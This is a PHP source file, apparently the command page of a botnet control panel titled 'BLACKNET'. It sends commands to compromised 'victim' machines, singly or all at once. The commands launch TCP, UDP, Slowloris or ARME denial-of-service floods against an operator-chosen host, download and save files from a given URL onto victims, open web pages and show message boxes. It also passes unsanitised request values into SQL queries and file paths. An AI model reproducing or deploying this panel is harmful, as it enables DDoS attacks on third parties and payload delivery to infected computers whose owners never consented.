<?php
require("config.php");
include('session.php');
$getclients = "SELECT * FROM Clients";
$printclients = mysqli_query($conn,$getclients);
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
        <link rel="shortcut icon" href="favico.png">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <title>BLACKNET - Execute Command</title>
    <link href="asset/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link href="asset/vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
    <link href="asset/vendor/datatables/dataTables.bootstrap4.css" rel="stylesheet">
    <link href="asset/css/sb-admin.css" rel="stylesheet">
  </head>
  <body id="page-top">
    <nav class="navbar navbar-toggleable-md navbar-dark bg-dark static-top">
      <a class="navbar-brand mr-1" href="index.php"><img src="favico.png" width="30" height="30" alt="">BLACKNET - v0.1  </a>
    <span class="navbar-text">
     Welcome <?php echo $login_session; ?> - <a href="logout.php">Logout</a>
    </span>
    </nav>
    <div id="wrapper">
      <div id="content-wrapper">
        <div class="container-fluid">
          <ol class="breadcrumb">
            <li class="breadcrumb-item">
              <a href="#">Command Menu</a>
            </li>
          </ol>
          <div class="card mb-3">
            <div class="card-header">
              <i class="fas fa-bolt"></i>
              Command Menu
            </div>
            <div class="card-body">
                  <?php
   
require_once 'config.php';
    if (!isset($_GET['command'])) {
          echo 'You did not select a command to execute on the target deveice 
         <br> Please go back and choose a command. <br> <a href="index.php">BLACKNET Main Interface</a>';
    }
if (isset($_GET['HWD'])) {
  $clinetHWD = $_GET['HWD'];
}
if ($clinetHWD == "All Clients"){
$getallclients = "SELECT * FROM Clients";
$printclients2 = mysqli_query($conn,$getallclients);
    $command = $_GET['command'];
    switch ($command) {
        case "Uninstall":
        while ($rows = mysqli_fetch_array($printclients2, MYSQLI_ASSOC)) {
         $remove="TRUNCATE TABLE Clients";
         $execute =  mysqli_query($conn,$remove);
         Send($rows['VicID'],'Uninstall');
       }
       echo 'Command Has Been Send To All Clinets';
       break;

      case "Select Command":
         echo 'You did not select a command to execute on the target deveice 
         <br> Please go back and choose a command. <br> <a href="index.php">BLACKNET Main Interface</a>';
         break;

      case "Close Connection":
        while ($rows = mysqli_fetch_array($printclients2, MYSQLI_ASSOC)) {
            $Connection = "UPDATE Clients SET Status='Offline'";
            $UpdateClient = mysqli_query($conn,$Connection);
            Send($rows['VicID'],'Close');
       }
       echo 'Command Has Been Send To All Clinets';
       break;

            case "DDOS Attack":
 echo("<body style='text-align: center;''>
        <form method='POST'>
         <table align='center'>
                 <tr>
                   <th>DDOS Attack - All Clients</th>
                 </tr>
                 <tr>
                 <td>Select The Attack Type</td>
                 </tr>
                 <tr>
               <td><select name='attacktype' id='attacktype'>
               <option>TCP Attack</option>
               <option>UDP Attack</option>
               <option>Slowloris Attack</option>
               <option>ARME Attack</option>
                </select></td>
                 </tr>
                 <tr>
                   <td>Enter Host to Attack</td>
                 </tr>
                 <tr>
                   <td><input type='input' name='TargetURL'></td>
                 </tr>
               </table> 
               <br>
               <button class='btn btn-dark'>Start DDOS</button>
            </form>
            </body>");

            while ($rows = mysqli_fetch_array($printclients2, MYSQLI_ASSOC)) {
              if ($_SERVER['REQUEST_METHOD'] == "POST") {

               if ($_POST['attacktype'] == "UDP Attack") {
               Send($rows['VicID'],"StartDDOS|BN|UDPAttack|BN|".$_POST['TargetURL']);
                  } else if ($_POST['attacktype'] == "TCP Attack") {
               Send($rows['VicID'],"StartDDOS|BN|TCPAttack|BN|".$_POST['TargetURL']);
                  } else if ($_POST['attacktype'] == "ARME Attack"){
               Send($rows['VicID'],"StartDDOS|BN|ARMEAttack|BN|".$_POST['TargetURL']);
				  }	else {
               Send($rows['VicID'],"StartDDOS|BN|SlowlorisAttack|BN|".$_POST['TargetURL']);
				  }				  
              }
            }
            if ($_SERVER['REQUEST_METHOD'] == "POST") {
                   echo 'Command Has Been Send To All Clients';

     }             
      break;
            case "Upload File":
                echo "<body style='text-align: center;'>
                 <form  method='POST' align='center'>
                <table align='center'>
               <tr>
                   <th>Upload File - All Clients</th>
                 </tr>
                 <tr>
                   <td>Download URL</td>
                 </tr>               
                 <tr>
                   <td><input type='input' name='FileURL'></td>
                 </tr>
                   <tr>
                   <td>Download Name</td>
                 </tr>
                 <tr>
                   <td><input type='input' name='Name'></td>
                 </tr>
               </table> 
               <br>
               <button class='btn btn-dark'>Upload File</button>
               </form>
                </body>";

                while ($rows = mysqli_fetch_array($printclients2, MYSQLI_ASSOC)) {
             if ($_SERVER['REQUEST_METHOD'] == "POST") {
                   Send($rows['VicID'],"UploadFile|BN|".$_POST['FileURL']."|BN|".$_POST['Name']);
              }
            }
            if ($_SERVER['REQUEST_METHOD'] == "POST") {
                   echo 'Command Has Been Send To All Clients';

     }       


              break;
                case "Ping":
             while ($rows = mysqli_fetch_array($printclients2, MYSQLI_ASSOC)) {
                   Send($rows['VicID'],"Ping");
            }
                        echo 'Command Has Been Send To All Clients';
                  break;
                 

                    case "Show Messagebox":
                echo "<body style='text-align: center;'>
                <form  method='POST' align='center'>
                <table align='center'>
                 <tr>
                   <th>Open Messagebox - All Clients</th>
                 </tr>
                 <tr>
                   <td>Message Title</td>
                 </tr>
                 <tr>
                   <td><input type='input' name='MessageTitle'></td>
                 </tr>
                   <tr>
                   <td>Message Content</td>
                 </tr>
                 <tr>
                   <td><input type='input' name='Content'></td>
                 </tr>
                 </tr>
                   <tr>
                   <td>MessageBox Icon</td>
                 </tr>
                 <tr>
                   <td><select name='msgicon' id='msgicon'>
                    <option selected>None</option>
                    <option >Information</option>
                    <option >Asterisk</option>
                    <option >Critical</option>
                    <option >Warning</option>
                    <option >Question</option>
                   </select></td>
                 </tr>
                   </tr>
                   <tr>
                   <td>MessageBox Button</td>
                 </tr>
                 <tr>
                   <td><select name='msgbutton' id='msgbutton'>
                    <option selected>OkOnly</option>
                    <option >OkCancel</option>
                    <option >YesNo</option>
                    <option >YesNoCancel</option>
                    <option >AbortRetryIgnore</option>
                    <option >RetryCancel</option>
                   </select></td>
                 </tr>
               </table> 
               <br>
               <button class='btn btn-dark'>Send Command</button>
               </form>
                </body>";

                while ($rows = mysqli_fetch_array($printclients2, MYSQLI_ASSOC)) {
             if ($_SERVER['REQUEST_METHOD'] == "POST") {
                   Send($rows['VicID'],"ShowMessageBox|BN|".$_POST['Content']."|BN|".$_POST['MessageTitle']."|BN|".$_POST['msgicon']."|BN|".$_POST['msgbutton']);              }
            }
            if ($_SERVER['REQUEST_METHOD'] == "POST") {
                   echo 'Command Has Been Send To All Clients';
     }       
             break;

            case "Open Webpage":
              echo "<body style='text-align: center;'>
                <form  method='POST' align='center'>
                 <table align='center'>
                   <tr>
                      <th>Open Webpage - All Clients</th>
                    </tr>
                    <tr>
                      <td>Page URL</td>
                    </tr>
                       <tr>
                        <td><input type='input' name='Weburl'></td>
                        </tr>
                      </table> 
                      <br>
                         <button class='btn btn-dark'>Send Command</button>
                        </form>
                </body>";
                while ($rows = mysqli_fetch_array($printclients2, MYSQLI_ASSOC)) {
             if ($_SERVER['REQUEST_METHOD'] == "POST") {
                   Send($rows['VicID'],"OpenPage|BN|".$_POST['Weburl']);
              }
            }
            if ($_SERVER['REQUEST_METHOD'] == "POST") {
                   echo 'Command Has Been Send To All Clients';

     }       
             break;

           default:
           echo 'Command is inCorrect'; 
           break;
           
            case "DDOS Linux":
 echo("<body style='text-align: center;''>
        <form method='POST'>
         <table align='center'>
                 <tr>
                   <th>DDOS Attack - All Clients</th>
                 </tr>
                 <tr>
                 <td>Select The Attack Type</td>
                 </tr>
                 <tr>
                   <td>Enter Host to Attack</td>
                 </tr>
                 <tr>
                   <td><input type='input' name='TargetURL'></td>
                 </tr>
               </table> 
               <br>
               <button class='btn btn-dark'>Start DDOS</button>
            </form>
            </body>");

            while ($rows = mysqli_fetch_array($printclients2, MYSQLI_ASSOC)) {
              if ($_SERVER['REQUEST_METHOD'] == "POST") {
               Send($rows['VicID'],"StartDDOS|BN|".$_POST['TargetURL']);
              }
            }
            if ($_SERVER['REQUEST_METHOD'] == "POST") {
                   echo 'Command Has Been Send To All Clients';

     }             
      break;
      
      
                  case "Print Linux":
       echo("<body style='text-align: center;''>
        <form method='POST'>
         <table align='center'>
                 <tr>
                   <th>Print Message - All Clients</th>
                 </tr>
                
                 <tr>
                   <td>Enter Messagek</td>
                 </tr>
                 <tr>
                   <td><input type='input' name='InputMessage'></td>
                 </tr>
               </table> 
               <br>
               <button class='btn btn-dark'>Send Message</button>
            </form>
            </body>");

            while ($rows = mysqli_fetch_array($printclients2, MYSQLI_ASSOC)) {
              if ($_SERVER['REQUEST_METHOD'] == "POST") {
               Send($rows['VicID'],"PrintMessage|BN|".$_POST['InputMessage']);
              }
            }
            if ($_SERVER['REQUEST_METHOD'] == "POST") {
                   echo 'Command Has Been Send To All Clients';

     }             
      break;
         
    }

} else {
  $command = $_GET['command'];
    switch ($command) {
        case "Uninstall":
         Send($clinetHWD,"Uninstall");
         $remove="DELETE FROM Clients WHERE VicID = '$clinetHWD'";
         $execute =  mysqli_query($conn,$remove);
         echo 'Cient Has Been Removed';
        break;
            case "DDOS Attack":
 echo("<body style='text-align: center;''>
        <form method='POST'>
           <table align='center'>
            <tr>
               <th>DDOS Attack - ".$clinetHWD."</th>
             </tr>
               <tr>
                  <td>Select The Attack Type</td>
               </tr>
                <tr>
                 <td><select name='attacktype' id='attacktype'>
                  <option>TCP Attack</option>
                  <option>UDP Attack</option>
                   <option>Slowloris Attack</option>
                     <option>ARME Attack</option>
                      </select>
                      </td>
                    </tr>
                    <tr>
                     <td>Enter Host to Attack</td>
                      </tr>
                      <tr>
                      <td><input type='input' name='TargetURL'></td>
                       </tr>
                        </table> 
                         <br>
              <button class='btn btn-dark'>Start DDOS</button>
            </form>
            </body>");
              if ($_SERVER['REQUEST_METHOD'] == "POST") {

               if ($_POST['attacktype'] == "UDP Attack") {
               Send($clinetHWD,"StartDDOS|BN|UDPAttack|BN|".$_POST['TargetURL']);
                  } else if ($_POST['attacktype'] == "TCP Attack") {
               Send($clinetHWD,"StartDDOS|BN|TCPAttack|BN|".$_POST['TargetURL']);
                  } else if ($_POST['attacktype'] == "ARME Attack"){
               Send($clinetHWD,"StartDDOS|BN|ARMEAttack|BN|".$_POST['TargetURL']);
				  }	else {
               Send($clinetHWD,"StartDDOS|BN|SlowlorisAttack|BN|".$_POST['TargetURL']);
				  }
                  echo 'Command Has Been Send';             
              }

            break;
            case "Upload File":
                echo "
                <body style='text-align: center;'>
                <form  method='POST' align='center'>
                <table align='center'>
                 <tr>
                   <th>Upload File - ".$clinetHWD."</th>
                 </tr>
                 <tr>
                   <td>Download URL</td>
                 </tr>
                 <tr>
                   <td><input type='input' name='FileURL'></td>
                 </tr>
                   <tr>
                   <td>Download Name</td>
                 </tr>
                 <tr>
                   <td><input type='input' name='Name'></td>
                 </tr>
               </table> 
               <br>
               <button class='btn btn-dark'>Upload File</button>
                   </form>";
             if ($_SERVER['REQUEST_METHOD'] == "POST") {
                   Send($clinetHWD,"UploadFile|BN|".$_POST['FileURL']."|BN|".$_POST['Name']);
                   echo 'Command Has Been Send';    
              }
                break;

                case "Ping":
                  Send($clinetHWD,"Ping");
                  echo 'Command Has Been Send';
                  break;

                case "Show Messagebox":
                echo "<body style='text-align: center;'>
                 <form  method='POST' align='center'>
                <table align='center'>
                 <tr>
                   <th>Open Messagebox - ".$clinetHWD."</th>
                 </tr>
                 <tr>
                   <td>Message Title</td>
                 </tr>
                 <tr>
                   <td><input type='input' name='MessageTitle'></td>
                 </tr>
                   <tr>
                   <td>Message Content</td>
                 </tr>
                 <tr>
                   <td><input type='input' name='Content'></td>
                 </tr>
                 </tr>
                   <tr>
                   <td>MessageBox Icon</td>
                 </tr>
                 <tr>
                   <td><select name='msgicon' id='msgicon'>
                    <option selected>None</option>
                    <option >Information</option>
                    <option >Asterisk</option>
                    <option >Critical</option>
                    <option >Warning</option>
                    <option >Question</option>
                   </select></td>
                 </tr>
                   </tr>
                   <tr>
                   <td>MessageBox Button</td>
                 </tr>
                 <tr>
                   <td><select name='msgbutton' id='msgbutton'>
                    <option selected>OkOnly</option>
                    <option >OkCancel</option>
                    <option >YesNo</option>
                    <option >YesNoCancel</option>
                    <option >AbortRetryIgnore</option>
                    <option >RetryCancel</option>
                   </select></td>
                 </tr>
               </table> 
               <br>
                <button class='btn btn-dark'>Send Command</button>
               </form>
              </body>";
             if ($_SERVER['REQUEST_METHOD'] == "POST") {
                   Send($clinetHWD,"ShowMessageBox|BN|".$_POST['Content']."|BN|".$_POST['MessageTitle']."|BN|".$_POST['msgicon']."|BN|".$_POST['msgbutton']);
                   echo 'Command Has Been Send';      
              }
            
             break;


            case "Open Webpage":
              echo "<body style='text-align: center;'>
                <form  method='POST' align='center'>
                <table align='center'>
                <tr>
                   <th>Open Webpage - ".$clinetHWD."</th>
                 </tr>
                 <tr>
                   <td>Page URL</td>
                 </tr>
                 <tr>
                   <td><input type='input' name='Weburl'></td>
                 </tr>
               </table> 
               <br>
               <button class='btn btn-dark'>Send Command</button>
               </form>
                </body>
                ";
             if ($_SERVER['REQUEST_METHOD'] == "POST") {
                   Send($clinetHWD,"OpenPage|BN|".$_POST['Weburl']);
                   echo 'Command Has Been Send';
              }
            
           break;

      case "Close Connection":
          $sql = "UPDATE Clients SET Status='Offline' WHERE VicID='$clinetHWD'";
          $UpdateClient = mysqli_query($conn,$sql);
         Send($clinetHWD,'Close');
         echo 'Command Has Been Send';
       break;

      case "Select Command":
         echo 'You did not select a command to execute on the target deveice 
         <br> Please go back and choose a command. <br> <a href="index.php">BLACKNET Main Interface</a>';
         break;
         
            case "DDOS Linux":
 echo("<body style='text-align: center;''>
        <form method='POST'>
         <table align='center'>
                 <tr>
                   <th>DDOS Attack - ".$clinetHWD."</th>
                 </tr>
                 <tr>
                   <td>Enter Host to Attack</td>
                 </tr>
                 <tr>
                   <td><input type='input' name='TargetURL'></td>
                 </tr>
               </table> 
               <br>
               <button class='btn btn-dark'>Start DDOS</button>
            </form>
            </body>");
              if ($_SERVER['REQUEST_METHOD'] == "POST") {
               Send($clinetHWD,"StartDDOS|BN|".$_POST['TargetURL']);
                echo 'Command Has Been Send To All Clients';
              }
      break;
      
      
       case "Print Linux":
 echo("<body style='text-align: center;''>
        <form method='POST'>
         <table align='center'>
                 <tr>
                   <th>Print Message - ".$clinetHWD."</th>
                 </tr>
                 <tr>
                   <td>Enter Message</td>
                 </tr>
                 <tr>
                   <td><input type='input' name='InputMessage'></td>
                 </tr>
               </table> 
               <br>
               <button class='btn btn-dark'>Send Message</button>
            </form>
            </body>");

              if ($_SERVER['REQUEST_METHOD'] == "POST") {
               Send($clinetHWD,"PrintMessage|BN|".$_POST['InputMessage']);
                  echo 'Command Has Been Send';
              }
        
      break;
         
         
    } 
}

function Send($USER , $Command) {
    $commandfile = fopen("Clients/".$USER.".txt", "w");
    $sendcommand = $Command;
    fwrite($commandfile, $sendcommand);
    fclose($commandfile);
}

function CheckData($data) {
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data);
    $data = strip_tags($data);
    $data = escapeshellcmd($data);
    return $data;
  }
?>
              </div>
      </form>
        </div>
      </div>
    </div>
    <a class="scroll-to-top rounded" href="#page-top">
      <i class="fas fa-angle-up"></i>
    </a>
    <script src="asset/vendor/jquery/jquery.min.js"></script>
    <script src="asset/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
    <script src="asset/vendor/jquery-easing/jquery.easing.min.js"></script>
    <script src="asset/vendor/datatables/jquery.dataTables.js"></script>
    <script src="asset/vendor/datatables/dataTables.bootstrap4.js"></script>
    <script src="asset/js/sb-admin.min.js"></script>
    <script src="asset/js/demo/datatables-demo.js"></script>
  </body>
</html>